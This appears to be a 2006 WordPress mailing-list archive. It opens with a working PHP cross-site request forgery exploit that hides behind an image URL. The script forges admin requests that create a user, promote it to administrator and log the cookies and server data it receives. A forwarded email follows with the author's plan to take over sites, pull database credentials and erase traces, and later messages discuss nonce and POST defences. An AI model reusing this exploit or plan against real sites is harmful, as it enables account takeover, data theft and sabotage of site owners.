// Get the site to attack from the referrer  htaccess passed in.
$UrlParts = parse_url($referrer);
 
// Hmmm, if the user name and password are ever sent, I should save them.
However IE blocked that pre SP2.
// So that will be a dry well for the most part.
$FileParts = pathinfo($file);
$nextuser = basename($file); 
$nextuser = basename($nextuser, ".jpg");   // Strip the extensions.  I'm
controlling what is sent, so this is a small list. 
$nextuser = basename($nextuser, ".gif");
$HistoryFileName = $UrlParts["host"].".htm";  // Store a different file for
each host 
// only create the user if a jpg is requested and the attack hasnt been done
before for this site
if (($FileParts["extension"] === "jpg")) &&
!(file_exists($HistoryFileName))) {
  $URL=$UrlParts[scheme]."://".$UrlParts[host]."/wp-admin/users.php";
  $REF=$URL;
 
// Build the submit string.  Sometime I should write a file that will do
this for me.  A Firefox plugin could do this...    
$submit="action=adduser&user_login=".$nextuser."&first_name=".$nextuser."&la
st_name=".$nextuser."&email=".$nextuser."@".$nextuser.".com&url=".$nextuser.
"&pass1=".$nextuser."&pass2=".$nextuser."&AddUser=Add User";
  foreach ( $_COOKIE as $ind=>$val )
    $cookie.= "$ind=$val;";
 
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $URL);
  curl_setopt($ch, CURLOPT_REFERER, $REF);
  curl_setopt($ch, CURLOPT_HOST, $UrlParts['host']);
  curl_setopt($ch, CURLOPT_POST, 1);
  // curl_setopt($ch, CURLOPT_COOKIE, $cookie);  // Rebuild cookie here if
this is a site specific attack
  curl_setopt($ch, CURLOPT_POSTFIELDS, $submit);
  curl_exec ($ch);
  curl_close ($ch);
 
  // Log the details of the attack
  ignore_user_abort(true);    ## prevent refresh from aborting file
operations and hosing file
  $fh = fopen($HistoryFileName, "a+");
  if ($fh) {
    if (flock($fh, LOCK_EX)){    ## don"t do anything unless lock is
successful
      // rewind($fh);
      fwrite($fh, "<html>  <br />\r\n");
      fwrite($fh, "Attack URL: ".$URL."  <br />\r\n");
      fwrite($fh, "Submitted Post vals: ".$submit."  <br />\r\n");
      fwrite($fh, "Cookie as came in:  <br />\r\n");
      foreach ( $_COOKIE as $ind=>$val )
        fwrite($fh, "$ind=$val;  <br />\r\n");
      fwrite($fh, "_SERVER as came in:  <br />\r\n");
      foreach ( $_SERVER as $ind=>$val )
        fwrite($fh, "$ind=$val;  <br />\r\n");
      fwrite($fh,
"---------------------------------------------------------------------------
-------------  <br />\r\n  <br />\r\n  <br />\r\n  <br />\r\n");
      fwrite($fh, "</html>  <br />\r\n");
 

      fflush($fh);
      ftruncate($fh, ftell($fh));
      flock($fh, LOCK_UN);
    }
    fclose($fh);
  }
}
// Always try to upgrade the user - it is a freebie
if (($FileParts["extension"] === "gif") || ($FileParts["extension"] ===
"jpg")) {
  $URL =
$UrlParts[scheme]."://".$UrlParts[host]."/wp-admin/user-edit.php?user_id=".$
nextuser;
  $REF = $URL;
 
$submit="from=profile&checkuser_id=1&user_login=".$nextuser."&role=administr
ator&first_name=".$nextuser."&last_name=".$nextuser."&nickname=".$nextuser."
&display_name=".$nextuser."&email=".$nextuser."@".$nextuser.".com&url&aim&yi
m&jabber&description&pass1=".$nextuser."&pass2=".$nextuser."&action=update&u
ser_id=".$nextuser."&submit=Update User";
  foreach ( $_COOKIE as $ind=>$val )
    $cookie.= "$ind=$val;";
 
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,"$URL");
  curl_setopt($ch, CURLOPT_REFERER,"$REF");
  curl_setopt($ch, CURLOPT_POST, 1);
  // curl_setopt($ch, CURLOPT_COOKIE, $cookie);  // Rebuild cookie here if
this is a site specific attack
  curl_setopt($ch, CURLOPT_POSTFIELDS, $submit);
  curl_exec ($ch);
  curl_close ($ch);
 

  $HistoryFileName = $UrlParts["host"]."_admin.htm";
  ignore_user_abort(true);    ## prevent refresh from aborting file
operations and hosing file
  $fh = fopen($HistoryFileName, "a+");
  if ($fh) {
    if (flock($fh, LOCK_EX)){    ## don"t do anything unless lock is
successful
      // rewind($fh);
      fwrite($fh, "<html>  <br />\r\n");
      fwrite($fh, $URL."  <br />\r\n");
      fwrite($fh, $submit."  <br />\r\n");
      foreach ( $_COOKIE as $ind=>$val )
        fwrite($fh, "$ind=$val;  <br />\r\n");
      fwrite($fh,
"---------------------------------------------------------------------------
-------------  <br />\r\n  <br />\r\n  <br />\r\n  <br />\r\n");
      fwrite($fh, "</html>  <br />\r\n");
      fflush($fh);
      ftruncate($fh, ftell($fh));
      flock($fh, LOCK_UN);
    }
    fclose($fh);
  }
}
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"
<http://www.URLTOSUCCESSIMG.com/images/YOUBEENHACKED.gif>
http://www.URLTOSUCCESSIMG.com/images/YOUBEENHACKED.gif");
curl_exec ($ch);
curl_close ($ch);
 
?> 

Now, you have several options.  If you can easily determine what the range
is of the next user to be created on the site is, you can put a bunch of
jpgs on the site with their file name being the expected number. 2.jpg,
3.jpg, 4.jpg 5.jpg and then it should work.
Alternatively, create a new user using a throw away email address.  Then
login as that user to get the user ID.  Then post something with a
UserID.gif image in it.  Your user will be upgraded to administrator when
that image is viewed.
 
You can again monitor for the htm files to see when that happens.  BTW, I've
made the file names in these attacks dynamic.  You could just as easily make
them static.  That logging method was made when I thought the other site's
cookies were fully available.  You could also have it simply post the
results of the attack to a webpage on your own server that stores all this
in a DB or setup a system so that it emails you when an upgrade attempt has
been made.  Then you aren't dirtying their server with these files.
 
Frankly, I'm glad I was misled on ease of cookie stealing through CSRF.  It
is that easy through XSS, but XSS is easy to protect against too.  If CSRF
could get cookies as it first appeared, just about anything would have been
vulnerable.  I'd rather appear an alarmist (as I unfortunatley do right now
- sorry) than to have that big of a hole there.  The current situation is
not ideal, but it sure limits the vulnerable systems.   That was another
reason why I kept the details off of the public list.  Creating a panic,
even if this hole was as big as I initially thought it was, would have
served no purpose.

-----Original Message-----
From: Brian Layman [mailto:Brian@TheCodeCave.com] 
Sent: Friday, April 21, 2006 10:35 PM
To: 'Security@wordpress.com'
Subject: A quick update on the security issue I'd mentioned today


I wanted to let you all know where I was at before you figured I was just
completely bogus.
 
Here's what I had this afternoon:
Functionality:
1. I have an url that looks and functions as a standard gif or jpg
reference.
2. When that url is activated/viewed with a referrer, the payload is
activated.
3. One url creates a new user with a specified username.
4. One url upgrades that user to administrator status
 
Limitations:
1. If the user already exists, it either displayed a invalid image icon or
if clicked directly, took the admin to a UserAlready exists error.
2. Everything was hard coded.
3. It would try to run if it was not user
 
Technologies:
1. All work would be fully functional on a free 1and1.com account with its
default install (or their $2.99 a month account).  It could be likewise done
through a dyndns link to a home machine.
2. This tecnique retrieves the blog's cookies, all the blog's session info,
proving cookies are not safe.  

3. It forges the referrer from scratch.  Proving not that the referrer is a
bad idea, but that it only blocks out script kiddies.
4. The attack submits multiple posts just from the one image reference.
Proving that posts are little more hinderence than gets.
 
Game plan:
1. Find any WP site that allows you to register as a subscriber.
2. Revisit it through an anonimizer. Create a new user just to get the ID of
the next user to be created.
3. Make a post with a fake user name that contains a Nuclear Smiley (TM) to
upgrade me to an admin
3. Monitor my attack directory for a new file with the website's name
indicating I've been upgraded.
4. Once I am in as an admin, use manage files to get the database &
password.
5. From that point, delete all the users and comments I may have made.  I
can do everything else through mySQL which won't show up in the logs most
people have access to.
 
What I have completed tonight or am working on now (* I'm working on it now
or it needs further testing):
1. Grabs the site to attack from the referrer
2. Only attacks if the cookie indicates it is from a wp site
3. Only attacks if the username is admin* (both are easy to do just haven't
gotten to it yet)
4. Grabs the next UserID from the name of the jpg referenced
5. Records a file with the username and password if it was created
successfully
6. Does not attempt to recreate the user if the history file exists
7. If the file referenced is a jpg, create AND upgrade the user* (I think
this worked but I need to retest)
8. If the file referenced is a gif, only upgrade the user
9. Store a file if the user has been upgraded.* (just thought of it)
10. If the hack is successful (aka not halted) display as a "You now have a
new admin" image.
11.  If no attempt at hacking is made, display a default image.
 
Right now, I can now look at any public php file, determine what it submits,
create a new redirect on my blog for it, and submit it with ANY info I want.
I suspect that 80%-90% of opensource the CMS sites are vulnerable to this.
I've looked around my VBulletin source code and I see nothing to indicate
that I shouldn't be able to create and promote a user the same way.  
Another easier approach to all of this could be to simply steal the cookie
information and recreate the cookie on my own site.    I REALLY REALLY
REALLY hope that windows makes cookie content unique per logged in user, but
if that isn't the case, I might just be able to log in as the admin only by
storing the cookie on my site.  No muss no fuss.  I really hope that isn't
the case.
 

Stuff I want to try: (but won't on real sites)  
1. Make the first attack on the list a change of the notification email (or
is there a "notify when new user is created" switch to toggle? need to
check.)

2. Determine the site can login and retreive the wp_config.php file into a
local file on on fell swoop. 
3. If 2 was possible, delete the newly created user (easy) and if possible,
the comment used to create it.
4. Make the last attack a restoration of the notification email address.
5. Create other attacks that don't try to hide themselves. Such as:

    a. Get the User ID from the session info and assign a known password to
that user and email the blog name, user name and password back to me.

    b. Upgrade EVERYONE to full admin access every time the picture is
viewed by one of the admins.

    c. Put the current post number in the image file name, delete a random
post between 1 and that max post number every time the image is viewed.

    d. Add TheCodeCave.com to everyone's blog roll. MWahhahaha  (OK not a
good idea...)
 

 
There are just a couple things to clean up but TBH I'm fried.  For various
reasons, I've only slept one night out of the last 3.  I doubt I'll finish
this to my satisfaction tonight, I'm probably gonna head off to bed now, but
I should be sending you an url tomorrow.
 
_______________________________________________
Brian Layman
www.TheCodeCave.com
"Obscurity through Verbosity"

From nuclearmoose at gmail.com  Mon Apr 24 16:37:51 2006
From: nuclearmoose at gmail.com (Craig)
Date: Mon Apr 24 16:42:04 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CF914.7000805@ryanduff.net>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<444CBFA1.7080405@midnightcircus.com>
	<444CC938.7040908@metalab.unc.edu> <444CCBDE.5050705@atl.lmco.com>
	<444CD748.30306@metalab.unc.edu> <444CDE1E.1020202@atl.lmco.com>
	<444CE7F9.3000300@metalab.unc.edu> <444CEC6C.5050000@atl.lmco.com>
	<444CEF6E.2080409@metalab.unc.edu> <444CF914.7000805@ryanduff.net>
Message-ID: <5aa3aa0604240937p24dd42efu94f74832e7c4b3c0@mail.gmail.com>

My user-level contribution to this debacle is as follows:
http://critterweb.com/btneuro/media/spinning/spinning_tank.wmv

Safe for all audiences.

Craig.
NuclearMoose.
From Brian at TheCodeCave.com  Mon Apr 24 16:40:38 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 24 16:44:49 2006
Subject: [wp-hackers] RE: A quick update on the security issue I'd
	mentionedtoday
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98090@dsimail.drbsystems.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98092@dsimail.drbsystems.com>

Sigh.... sorry all... 

That meant for security at word press... I don't suppose a list admin can
delete this from the public journal?

SMACKS HEAD REPEATEDLY

From ryan at ryanduff.net  Mon Apr 24 16:54:08 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Mon Apr 24 16:58:30 2006
Subject: [wp-hackers] RE: A quick update on the security issue
	I'd	mentionedtoday
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98092@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98092@dsimail.drbsystems.com>
Message-ID: <444D02B0.7090905@ryanduff.net>

Brian Layman wrote:
> Sigh.... sorry all... 
> 
> That meant for security at word press... I don't suppose a list admin can
> delete this from the public journal?
> 
> SMACKS HEAD REPEATEDLY
> 

There is a way to do this that involves taking down the mail services 
(all messages will bounce for a few minutes) finding the message ID and 
clearing the content of that file. Then reloading this that and the 
other and starting the mail services again. I think it takes about 5-10 
minutes to do, and can be a pain in the arse sometimes.

But yes, it is doable.

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress #plogger
From Brian at TheCodeCave.com  Mon Apr 24 17:01:38 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 24 17:05:49 2006
Subject: [wp-hackers] RE: A quick update on the security issue I'd
	mentionedtoday
In-Reply-To: <444D02B0.7090905@ryanduff.net>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98093@dsimail.drbsystems.com>

The damage is mostly already done, I'm sure.  Someone will be blogging about
it.  But I'd rather keep it out of Google as much as possible...  I did not
want to create a one stop shop for attacking sites.  That won't help anyone
other than those that don't need to be helped.  

All of this information is out there in bits and pieces.  I just put it
together in one place.

From jjb at ibiblio.org  Mon Apr 24 17:02:58 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Mon Apr 24 17:07:23 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CE7F9.3000300@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<444CC938.7040908@metalab.unc.edu>
	<444CCBDE.5050705@atl.lmco.com> <444CD748.30306@metalab.unc.edu>
	<444CDE1E.1020202@atl.lmco.com> <444CE7F9.3000300@metalab.unc.edu>
Message-ID: <Pine.LNX.4.61.0604241258280.13441@tribal.metalab.unc.edu>


On Mon, 24 Apr 2006, Elliotte Harold wrote:

> The core team seems to want to implement a complex nonce based solution. 
> I suspect there's a simpler, more robust solution using POST instead of 
> GET.

Just on the subject of nonces and POST... even if all side-effect actions 
used POST, there are still security vulnerabilities that a nonce system 
will defeat. One example is making a webpage that looks just like the 
admin interface but isn't, and then using social engineering to get the 
victim (who has an authorization cookie) to use the impostor form. 
(checking admin referers also defeats some or all of these cases as well)

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/

From davebytes at comcast.net  Mon Apr 24 17:15:37 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Apr 24 17:19:11 2006
Subject: [wp-hackers] Security at Wordpress
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com><444CF263.8000006@concept64.com>
	<444CF6A6.9010002@midnightcircus.com>
Message-ID: <015501c667c2$b569bd40$6e01a8c0@sixfour>

Coincidentally, I had written an email about 'revisiting the trash can' 
thing -- and just found it was sent from the wrong account (and apparently 
thus eaten without response).  I'm reposting it now.

Trash can, recycle bin, whatever should alleviate ANY potential issues with 
mass-deletion of posts, comments, etc.  And would improve usability for the 
average user (imho).  Not to mention once in a blue moon it'd be real 
helpful for the techies who accidentally delete a comment they didn't mean 
to (who, me?).

Doing checkboxes for 'actions' on a group of 'items'... hmmm.  That sounds 
like most of the non-Web2.0 email apps (i.e., non-drag-and-drop web apps) 
I've used.  Actually, hmmm... phpMyAdmin uses the same metaphor.  Can't be 
THAT bad, can it?  I prefer the check-then-act approach as it's a bit more 
like the drag-and-drop direct manipulation (that is, if you multi-select 
items, then 'act' on them, that's like checking off a bunch of items then 
acting from a picklist/dropdown, or action buttons at the bottom...).

Just IMHO.  I'm not on either side of the post/get argument, I just think 
that in this particular suggestion, doing checkbox/multi actions via POST is 
a good enhancement and 'simplification' of the UI.

-d

----- Original Message ----- 
Owen Winkler wrote
| > 5. adds new functionality for mass delete of posts (even if not needed)
|
| Oops.  I just accidentally deleted <s>that one post</s> *everything*.
| Oh, dear.
| Time to revisit this:
| http://www.asktog.com/columns/069ScottAdamsMeltdown.html

From davebytes at comcast.net  Mon Apr 24 17:19:04 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Apr 24 17:22:32 2006
Subject: [wp-hackers] Reposting my lost chronicle: Revisiting the 'Trash
	Can' idea...
Message-ID: <015901c667c3$2fc9dd40$6e01a8c0@sixfour>

Off the whole 'someone can get me to delete something' thread, I had posted 
a new thread -- unfortunately from the wrong email account, and apparently 
got no bounce message.  So, here's my email, again...

----------

A while back there was discussion of having deletions go to a conceptual
'trash' state, which could later be emptied (automatically over some time
period, or manually, OR restored).  This came back to me as I said to myself
"Gee, Nonces seem great.  But if there's another vector that somehow gets me
to try and delete my own stuff, is there a way I can recover quickly?"
Which brought me back to the trashcan.

The discussion revolved, I believe, around two points:
1. Do we really need 'undo' around deletions?  Or, at that point, around
other actions.
2. If it seems useful, how do we implement it quickly, so it 'drops' right
into the existing architecture with minimal impact.

We obviously wouldn't want 'trash' tables for every possible type of
content... Keeping the 'trashed' items in the main tables has benefits (just
another 'state', so as easy to query and list as any other 'state').

I just thought of maybe have a single trash table which could use an
ID-table pair to reference into other tables (posts, comments, whatever)
flexibly, with the timestamp of the deletion, and the prior-state of
whatever status field had to be set to 'trash'.  That would keep from
(ab)using the postmeta or other tables, and 'centralize' history of changes
across the system (which, obviously, could be expanded to tracking changes
OTHER than just deletion... thinking of potential future applications of
this...)

Anyway, just wanted to start this back up, as I still think there's some
useful tidbits here, love to hear opinions (again) now that time has passed,
a new WP version is out, etc.

I should say that this new idea of a trash table (or 'change' table) seems
to have some merit, and might make people think of other ways to use it.
Maybe using the 'per major area' meta table to store such infomation would
be just as good... I don't know.

Overall, given that the referrer discussion, and Nonces discussion, leads to
a situation where there still aren't AYS checks for everything, I feel
some need to give the average end-user a 'safety net' -- if they in
fact need it!  Which, I guess, has yet to be proven.. ;)  I mean, we know
they want/need an integrated spell checker... :)

-d

From wp-hackers at paul-mitchell.me.uk  Mon Apr 24 17:20:47 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Mon Apr 24 17:25:49 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CF263.8000006@concept64.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com>
Message-ID: <444D08EF.6050002@paul-mitchell.me.uk>

Ryan Scheuermann wrote:
> I mean, using a checkbox form for post delete solves a lot of the
> current issues:
>
> 1. post/page delete uses POST and HTTP spec is not violated!  hay!
> 2. no worries about a consistent looking form button across browsers
> if there is only 1 on the bottom of the page
> 3. no need for nonces if the delete action requires POST
> 4. no security issues because links can't POST (security being the
> original concern of this thread)
> 5. adds new functionality for mass delete of posts (even if not needed)
> 6. no accidental deletions with Javascript disabled/missing
> 7. follows a widely accepted and user-friendly model for web applications
>
> Are there any other angles we haven't thought of?
Not sure about 3. I think the nonces are a good idea, arguments about
implementation aside They create a verifiable relationship between cause
and effect in the interface, beyond form and method.

Would AJAX work with this approach? If so, that would be my number 3.
Multiple deleted posts could disappear one-at-a-time with that cool
"fade-out, slide-up" effect.

Paul

From jjb at ibiblio.org  Mon Apr 24 17:12:35 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Mon Apr 24 17:32:02 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <Pine.LNX.4.61.0604241258280.13441@tribal.metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<444CC938.7040908@metalab.unc.edu>
	<444CCBDE.5050705@atl.lmco.com> <444CD748.30306@metalab.unc.edu>
	<444CDE1E.1020202@atl.lmco.com> <444CE7F9.3000300@metalab.unc.edu>
	<Pine.LNX.4.61.0604241258280.13441@tribal.metalab.unc.edu>
Message-ID: <Pine.LNX.4.61.0604241311470.13441@tribal.metalab.unc.edu>


On Mon, 24 Apr 2006, John Joseph Bachir wrote:

> Just on the subject of nonces and POST... even if all side-effect 
> actions used POST, there are still security vulnerabilities that a nonce 
> system will defeat. One example is making a webpage that looks just like 
> the admin interface but isn't, and then using social engineering to get 
> the victim (who has an authorization cookie) to use the impostor form. 
> (checking admin referers also defeats some or all of these cases as 
> well)

Whoops, just saw that Owen already mentioned this 10 emails back :)

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/

From dmhouse at gmail.com  Mon Apr 24 17:34:00 2006
From: dmhouse at gmail.com (David House)
Date: Mon Apr 24 17:38:10 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CF6A6.9010002@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<444CBFA1.7080405@midnightcircus.com>
	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
	<444CE689.6050202@midnightcircus.com> <444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
	<444CEC48.9060309@concept64.com>
	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com> <444CF6A6.9010002@midnightcircus.com>
Message-ID: <ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>

On 24/04/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> Using POST does not obviate nonces or referer checks.

Lets just re-iterate that, folks.

> Using POST does not obviate nonces or referer checks.

One more time with feeling.

> Using POST does not obviate nonces or referer checks.

A little aside for anyone who doesn't understand the attack vector:
You log into your blog one day to do a little tidying up. You start to
notice how great an author you are and what a huge shame it would be
if someone deleted one of your posts. You then browse to another site.
Because you are Average Joe User, you don't hit the "Log Out" button
on your way out, because it's inconvenient (you'd have to type your
password the next time you arrived if you did that).

You're browsing your way through the World Wide Web, and you come across this:

http://asymptomatic.net/temp/hack.htm

(Perhaps worded a little subtler in real life. Dressed up as a comment
to a post on a another blog, a post that had trackbacked one of your
masterpieces, perhaps?). You click it, and OOPS! It's too late. There
goes one of your posts.

Therefore, we either need nonces or a referer check. Referer checks
are a pain to those firewalled, and are easy to miss, so I'd vote for
nonces.

And thus, anyone that says switching to POST is a magic bullet needs
to rethink their views. Switching is _not_ a less complex solution, as
it would have to be introduced on top of nonces anyway.

However, I am a standards-are-good kind of guy and I would like to see
a solution where we use POST wherever possible, with GET only as a
fallback. Andrew K showed us that the UI hit is somewhat negligible
(although a proper cross-browser solution is a prerequisite), so you
have my +1 here. Basically, I don't see any advantage or disadvantage
of either POST or GET.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From lists at abhaykumar.net  Mon Apr 24 18:05:23 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Mon Apr 24 18:10:07 2006
Subject: [wp-hackers] RE: A quick update on the security issue I'd
	mentionedtoday
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98093@dsimail.drbsystems.com>
References: <444D02B0.7090905@ryanduff.net>
	<D0252C90757CBC4B8BC938A72BEDDF9DF98093@dsimail.drbsystems.com>
Message-ID: <512061b90604241105needb05bqc639f6569c13e5c8@mail.gmail.com>

> The damage is mostly already done, I'm sure.  Someone will be blogging about
> it.  But I'd rather keep it out of Google as much as possible...  I did not
> want to create a one stop shop for attacking sites.  That won't help anyone
> other than those that don't need to be helped.
Unfortunuately, the mailing list archives are indexed by google.

> All of this information is out there in bits and pieces.  I just put it
> together in one place.
True.

--
Abhay Kumar
http://abhaykumar.net/
From lists at abhaykumar.net  Mon Apr 24 18:05:23 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Mon Apr 24 18:11:53 2006
Subject: [wp-hackers] RE: A quick update on the security issue I'd
	mentionedtoday
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98093@dsimail.drbsystems.com>
References: <444D02B0.7090905@ryanduff.net>
	<D0252C90757CBC4B8BC938A72BEDDF9DF98093@dsimail.drbsystems.com>
Message-ID: <512061b90604241105needb05bqc639f6569c13e5c8@mail.gmail.com>

> The damage is mostly already done, I'm sure.  Someone will be blogging about
> it.  But I'd rather keep it out of Google as much as possible...  I did not
> want to create a one stop shop for attacking sites.  That won't help anyone
> other than those that don't need to be helped.
Unfortunuately, the mailing list archives are indexed by google.

> All of this information is out there in bits and pieces.  I just put it
> together in one place.
True.

--
Abhay Kumar
http://abhaykumar.net/
From ryan at concept64.com  Mon Apr 24 18:22:41 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 18:26:59 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>
	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>	<444CF263.8000006@concept64.com>
	<444CF6A6.9010002@midnightcircus.com>
	<ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
Message-ID: <444D1771.9090805@concept64.com>

David House wrote:
> On 24/04/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>   
>> Using POST does not obviate nonces or referer checks.
>>     
>
> Lets just re-iterate that, folks.
>
>   
>> Using POST does not obviate nonces or referer checks.
>>     
>
> One more time with feeling.
>
>   
>> Using POST does not obviate nonces or referer checks.
>>     
>
> A little aside for anyone who doesn't understand the attack vector:
> You log into your blog one day to do a little tidying up. You start to
> notice how great an author you are and what a huge shame it would be
> if someone deleted one of your posts. You then browse to another site.
> Because you are Average Joe User, you don't hit the "Log Out" button
> on your way out, because it's inconvenient (you'd have to type your
> password the next time you arrived if you did that).
>
> You're browsing your way through the World Wide Web, and you come across this:
>
> http://asymptomatic.net/temp/hack.htm
>
> (Perhaps worded a little subtler in real life. Dressed up as a comment
> to a post on a another blog, a post that had trackbacked one of your
> masterpieces, perhaps?). You click it, and OOPS! It's too late. There
> goes one of your posts.
>
> Therefore, we either need nonces or a referer check. Referer checks
> are a pain to those firewalled, and are easy to miss, so I'd vote for
> nonces.
>
> And thus, anyone that says switching to POST is a magic bullet needs
> to rethink their views. Switching is _not_ a less complex solution, as
> it would have to be introduced on top of nonces anyway.
>
> However, I am a standards-are-good kind of guy and I would like to see
> a solution where we use POST wherever possible, with GET only as a
> fallback. Andrew K showed us that the UI hit is somewhat negligible
> (although a proper cross-browser solution is a prerequisite), so you
> have my +1 here. Basically, I don't see any advantage or disadvantage
> of either POST or GET.
>
> --
> -David House, dmhouse@gmail.com, http://xmouse.ithium.net
>   
Well put, good sir.  I apologize for thinking POST would obviate nonces 
/ referrer checks.  The sheer length of this discussion had caused me to 
forget all the angles.  :-)

Although, common sense (and the spec) would say using GET for delete is 
well, just bad.  Especially on something so critical as whole posts/pages.

Now, it would seem, changing to POST wherever possible is a mostly 
academic venture.  Is it worth the time?  I'm undecided on this.  If the 
general consensus is that we should change to POST for essential things 
like deleting posts/pages (maybe not approve/delete comments?), I'll 
volunteer to code the patch.  But I won't code it just to prove a now 
moot point about security.


Ryan
From angsuman at taragana.com  Mon Apr 24 18:36:11 2006
From: angsuman at taragana.com (Angsuman Chakraborty)
Date: Mon Apr 24 18:40:27 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <Pine.LNX.4.61.0604241311470.13441@tribal.metalab.unc.edu>
Message-ID: <MJEEIIFCKOJBBNFPJGJCKENPLDAA.angsuman@taragana.com>

Hi,

